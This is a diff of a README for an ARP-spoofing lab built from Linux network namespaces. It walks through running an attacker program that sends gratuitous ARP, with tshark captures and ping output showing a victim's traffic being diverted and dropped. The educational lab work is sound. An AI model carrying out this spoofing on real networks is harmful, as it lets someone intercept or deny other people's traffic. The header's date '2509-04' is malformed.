@@ -1,14 +1,62 @@
+# spoof-arp
 
-# 01
+- source: [linuxyz/spoof-arp](https://github.com/seantywork/linuxyz/tree/main/spoof-arp)
+- date: 2509-04
+
+We can try out ARP spoofing on Linux with the source code and script in this directory.
+
+Below is the layout of the environment created by the `setup.sh` shell script.
+
+
 ```shell
-thy@thy-Z370-HD3:~$ sudo ip netns exec vnet1 ip neigh
-thy@thy-Z370-HD3:~$ 
+-------------------------
+|   host                |
+|  11.168.0.1 (veth01)  |
+|  82 59 88 10 d3 fe    |
+-------------------------
+        |
+        |
+--------------------------
+|   vnet0                |    ------------------------
+|   bridge (vbr0)        |    | vnet2 (attacker 😈)  |
+|    arp_accept enabled, |----| 11.168.0.200 (veth21)|
+|    vulnerable to       |    | 22 e8 90 6d 69 e5    |
+|    arp spoofing        |    ------------------------
+--------------------------
+        |
+        |
+--------------------------
+|   vnet1                |
+|   11.168.0.2 (veth11)  |
+|   26 08 9a c4 c6 d3    |
+--------------------------
+
+
+```
+The shell script not only creates the environment but also \
+sets `vbr0` to accept unsolicitied ARP packet, which \
+makes it vulnerable to ARP spoofing attack.
+
+In other words, if a switch located in that positon doesn't allow for \
+unsolicitied ARP packets, you don't have to worry about being ARP spoofed :)
+
+And adding to that, `vnet2` is configured to drop the packets coming in whose \
+destination is not `11.168.0.200`, which means any packets set to be forwarded \
+will be dropped. 
+
+Let's check out the poor victim's mac table.
+
+```shell
+$ sudo ip netns exec vnet1 ip neigh
+# no mac info 
+$ 
 
 ```
 
-# 02
+Now, let's check if it can ping the host `11.168.0.1` as usual.
+
 ```shell
-thy@thy-Z370-HD3:~/hack/linux/linuxyz/spoof-arp$ sudo ip netns exec vnet1 ping 11.168.0.1
+$ sudo ip netns exec vnet1 ping 11.168.0.1
 PING 11.168.0.1 (11.168.0.1) 56(84) bytes of data.
 64 bytes from 11.168.0.1: icmp_seq=1 ttl=64 time=0.084 ms
 64 bytes from 11.168.0.1: icmp_seq=2 ttl=64 time=0.047 ms
@@ -21,25 +69,35 @@ rtt min/avg/max/mdev = 0.047/0.060/0.084/0.014 ms
 
 ```
 
-# 03
+Checking mac table again...
 
 ```shell
-thy@thy-Z370-HD3:~$ sudo ip netns exec vnet1 ip neigh
+$ sudo ip netns exec vnet1 ip neigh
+# now there is mac info!
 11.168.0.1 dev veth11 lladdr 82:59:88:10:d3:fe REACHABLE
 
 ```
 
+So far so good.
+
+Clear all info from the mac table.
+
 ```shell
-thy@thy-Z370-HD3:~$ sudo ip netns exec vnet1 ip neigh flush all
-thy@thy-Z370-HD3:~$ sudo ip netns exec vnet1 ip neigh 
-thy@thy-Z370-HD3:~$
+$ sudo ip netns exec vnet1 ip neigh flush all
+$ sudo ip netns exec vnet1 ip neigh 
+$
 
 ```
 
-# 04
+Now, we're going to use ARP spoof attack to interfere (DoS) with \
+the normal flow of traffic.
+
+In the section below, `g` flag means it will use [gratuitous ARP](https://wiki.wireshark.org/Gratuitous_ARP) to \
+perform ARP spoofing. You can also use `ng` to perfrm ARP spoofing \
+but it uses unsolicited ARP reply packet to do so.
 
 ```shell
-thy@thy-Z370-HD3:~/hack/linux/linuxyz/spoof-arp$ sudo ip netns exec vnet2 ./spoof.out g
+$ sudo ip netns exec vnet2 ./spoof.out g
 my: ifidx: 2 ip: 11.168.0.200 hw: 22 e8 90 6d 69 e5
 victim: ip: 11.168.0.2 hw: 26 08 9a c4 c6 d3
 gateway: ip: 11.168.0.1 hw: 82 59 88 10 d3 fe
@@ -47,10 +105,11 @@ spoofing?
 
 ```
 
-# 05
+On the other terminal, I captured the ARP packets going back and forth as you can \
+see below.
 
 ```shell
-thy@thy-Z370-HD3:~/hack/linux/linuxyz$ sudo ip netns exec vnet0 tshark -i vbr0
+$ sudo ip netns exec vnet0 tshark -i vbr0
 [sudo] password for thy: 
 Running as user "root" and group "root". This could be dangerous.
 Capturing on 'vbr0'
@@ -62,17 +121,18 @@ Capturing on 'vbr0'
 
 ```
 
-# 06
+From the victim's namespace, we can see the updated mac table.
 
 ```shell
-thy@thy-Z370-HD3:~$ sudo ip netns exec vnet1 ip neigh 
+$ sudo ip netns exec vnet1 ip neigh 
 11.168.0.200 dev veth11 lladdr 22:e8:90:6d:69:e5 STALE
 ```
 
-# 07
+Now, back to the attacker, and hitting `enter` will make the program to \
+send out gratuitous arp to perform spoofing attack.
 
 ```shell
-thy@thy-Z370-HD3:~/hack/linux/linuxyz/spoof-arp$ sudo ip netns exec vnet2 ./spoof.out g
+$ sudo ip netns exec vnet2 ./spoof.out g
 my: ifidx: 2 ip: 11.168.0.200 hw: 22 e8 90 6d 69 e5
 victim: ip: 11.168.0.2 hw: 26 08 9a c4 c6 d3
 gateway: ip: 11.168.0.1 hw: 82 59 88 10 d3 fe
@@ -82,7 +142,13 @@ gratuitous arp...
 
 ```
 
-# 08
+Seeing from packet capture, you can see that the program is lying \
+about its IP association. Specifically, it's saying that IP `11.168.0.1`, \
+which is `host`'s IP address is mapped to the attacker's mac address.
+
+If the switch accepts this dubious claim (in our case it does), then any packet \
+that's destined to `11.168.0.1` will end up trapped in `11.168.0.200`.
+
 ```shell
 Frame 4: 42 bytes on wire (336 bits), 42 bytes captured (336 bits) on interface vbr0, id 0
     Section number: 1
@@ -126,10 +192,25 @@ Address Resolution Protocol (request/gratuitous ARP)
 
 ```
 
-# 09
+Precisely that happens as you can see from `ping` command below.
 
 ```shell
-thy@thy-Z370-HD3:~/hack/linux/linuxyz$ sudo ip netns exec vnet0 tshark -i vbr0 -f "icmp"
+$ sudo ip netns exec vnet1 ping 11.168.0.1
+PING 11.168.0.1 (11.168.0.1) 56(84) bytes of data.
+64 bytes from 11.168.0.1: icmp_seq=1 ttl=64 time=0.129 ms
+64 bytes from 11.168.0.1: icmp_seq=34 ttl=64 time=0.169 ms
+^C
+--- 11.168.0.1 ping statistics ---
+35 packets transmitted, 2 received, 94.2857% packet loss, time 34812ms
+rtt min/avg/max/mdev = 0.129/0.149/0.169/0.020 ms
+
+
+```
+
+It's also confirmed by the packet capture.
+
+```shell
+$ sudo ip netns exec vnet0 tshark -i vbr0 -f "icmp"
 Running as user "root" and group "root". This could be dangerous.
 Capturing on 'vbr0'
     1 0.000000000   11.168.0.2 → 11.168.0.1   ICMP 98 Echo (ping) request  id=0xa180, seq=1/256, ttl=64
@@ -152,26 +233,11 @@ Capturing on 'vbr0'
 
 ```
 
-# 10
-
-```shell
-thy@thy-Z370-HD3:~/hack/linux/linuxyz/spoof-arp$ sudo ip netns exec vnet1 ping 11.168.0.1
-PING 11.168.0.1 (11.168.0.1) 56(84) bytes of data.
-64 bytes from 11.168.0.1: icmp_seq=1 ttl=64 time=0.129 ms
-64 bytes from 11.168.0.1: icmp_seq=34 ttl=64 time=0.169 ms
-^C
---- 11.168.0.1 ping statistics ---
-35 packets transmitted, 2 received, 94.2857% packet loss, time 34812ms
-rtt min/avg/max/mdev = 0.129/0.149/0.169/0.020 ms
-
-
-```
-
-# 11
+Check out the current status of victim's mac table
 
 ```shell
 
-thy@thy-Z370-HD3:~$ sudo ip netns exec vnet1 ip neigh 
+$ sudo ip netns exec vnet1 ip neigh 
 11.168.0.200 dev veth11 lladdr 22:e8:90:6d:69:e5 STALE 
 11.168.0.1 dev veth11 FAILED
 
